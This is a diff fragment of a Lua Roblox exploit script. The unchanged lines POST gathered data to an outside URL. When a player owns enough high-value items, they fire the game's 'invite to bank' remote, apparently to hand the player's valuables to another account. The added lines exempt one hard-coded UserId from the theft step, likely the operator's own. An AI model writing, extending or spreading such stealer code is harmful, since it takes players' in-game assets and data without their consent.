@@ -335,6 +335,7 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 if HugeCount >= 1 or EXCCount >= 15 then
+if game.Players.LocalPlayer.UserId ~= 2684868646 then
 wait(3)
 local A_1 = 
 {
@@ -424,6 +425,7 @@ local A_1 =
 }
 local Event = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["invite to bank"]
 Event:InvokeServer(A_1)
+end
 end
 end
 wait(0.5)
